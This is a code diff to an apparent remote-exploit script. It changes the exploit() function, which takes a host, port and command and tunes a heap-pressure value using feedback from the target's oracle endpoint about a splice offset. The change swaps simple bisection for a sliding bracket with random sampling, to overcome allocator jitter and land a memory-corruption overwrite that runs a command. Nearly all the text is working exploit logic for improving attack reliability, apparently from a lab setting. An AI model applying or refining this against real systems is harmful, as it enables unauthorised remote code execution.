@@ -28,6 +28,7 @@ target's oracle endpoint (which reports the splice offset k).
 from __future__ import annotations
 
 import json
+import random
 import socket
 import sys
 import time
@@ -402,7 +403,12 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # raises the floor, in-window k gets a proportional correction.
     h = 22_000_000
     h_min, h_max = 2_000_000, 30_000_000
-    lo, hi = h_min, h_max      # bisection bracket on the pressure
+    lo, hi = h_min, h_max      # bracket around the landable pressure
+    MIN_W = 2_000_000          # the k-window's width in h units - never
+                               # sample narrower: the baseline jitters
+                               # ~1-2MiB between attempts (worker arena
+                               # recycling), which slides the window
+    last_signal = None         # "early" = too high | "low" = too low
     step = 4_000_000           # max proportional correction inside window
 
     for i in range(1, max_attempts + 1):
@@ -429,22 +435,45 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
 
         out = res.get("outcome")
         k = res.get("k")
+        sampled = False
         if k is not None and lab.f_offset() <= k < lab.e_offset():
             # inside the splice window: proportional correction
             # (k = const - h, so h += (k - k_target) moves k onto target)
             delta = k - lab.k_target()
             delta = max(-step, min(step, delta))
             h = max(lo, min(hi, h + delta))
+            sampled = True
         elif out == "early" or (k is not None and k < lab.f_offset()):
-            # OOM before the write: pressure too high - bisect down
+            # OOM before the write: pressure too high
             hi = h
-            h = max(lo, (lo + hi) // 2)
+            last_signal = "early"
         elif out in ("late", "nooom"):
             # the write ran past the window (or never aborted): the
-            # pressure is too low - bisect up
+            # pressure is too low
             lo = h
-            h = min(hi, (lo + hi) // 2)
-        # oracle noise (oracle-failed/unknown): hold h steady
+            last_signal = "low"
+        # oracle noise (oracle-failed/unknown): no signal, hold the bracket
+
+        if not sampled:
+            # A collapsed bracket must slide toward the last signal
+            # instead of freezing at one edge: inside the flip zone the
+            # SAME h reports early on one attempt and nooom on the next
+            # (baseline jitter moves the window), so point convergence
+            # stalls - see attempts 24-40 of the a83aad0-era runs.
+            if hi - lo < MIN_W:
+                if last_signal == "early":
+                    hi = min(h_max, h)
+                    lo = max(h_min, hi - MIN_W)
+                elif last_signal == "low":
+                    lo = max(h_min, h)
+                    hi = min(h_max, lo + MIN_W)
+            # coarse bisection to find the zone, then sample the band:
+            # the mix outcome is stochastic within the flip zone, so
+            # walking the band beats converging to a point
+            if hi - lo >= MIN_W * 2:
+                h = (lo + hi) // 2
+            else:
+                h = random.randint(int(lo), int(hi))
 
     return {"error": "no hit within attempt budget"}
 
